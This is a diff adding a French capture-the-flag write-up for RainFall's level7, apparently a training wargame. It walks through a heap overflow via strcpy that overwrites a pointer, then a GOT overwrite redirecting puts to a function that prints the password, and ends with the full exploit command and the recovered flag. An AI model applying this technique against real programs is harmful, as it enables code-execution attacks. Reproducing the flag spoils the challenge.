@@ -1,4 +1,53 @@
-1 -> 0x804a008 = 1
-2 -> 0x804a018 = 0
-3 -> 0x804a028 = 0
-4 -> 0x804a038 = 0
+Voici l'etat de la memoire alloue avant les appels a strcpy :
+
+"""
+gdb-peda$ x/16wx 0x0804a008
+0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
+0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
+0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
+0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
+"""
+
+Chaque ligne correspond a une allocation, on voit que les allocation 1 et 3 contiennent une adresse sur la prochaine allocation, respectivement 2 et 4
+
+"""
+strcpy(area1 + 4, *argv + 4);
+strcpy(area2 + 4, *argv + 8);
+"""
+
+Avec un buffer overflow sur le premier strcpy on peut ecraser l'adresse d'area2 + 4 et alors pouvoir mettre n'importe quel adresse qu'on souhaite modifie qui prendra alors le contenu du 2eme argument
+
+"""
+void	m(void)
+{
+	printf("%s - %d\n", glob, time(0));
+}
+"""
+
+"""
+	fgets(glob (0x8049960), "r", 68, fopen("/home/user/level8/.pass"));
+"""
+
+la fonction m affiche le contenu de variable glob qui contient le flag apres l'appel a fgets, il faut alors trouver une solution pour appeler cette fonction apres l'appel a fgets
+
+"""
+	fgets(glob (0x8049960), "r", 68, fopen("/home/user/level8/.pass"));
+	puts("~~" (0x8048703));
+"""
+
+Nous voyons ici qu'apres fgets, la fonction puts est appele. On peut alors ecraser l'adresse qui correspond a la fonction puts par celle de la fonction m
+
+"""
+level7@RainFall:~$ objdump -R ./level7
+08049928 R_386_JUMP_SLOT   puts
+"""
+
+"""
+level7@RainFall:~$ objdump -t ./level7 | grep m
+080484f4 g     F .text	0000002d              m
+""""
+
+Il faut 20 caracteres avant de pouvoir ecraser 'area2 + 4'
+
+level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
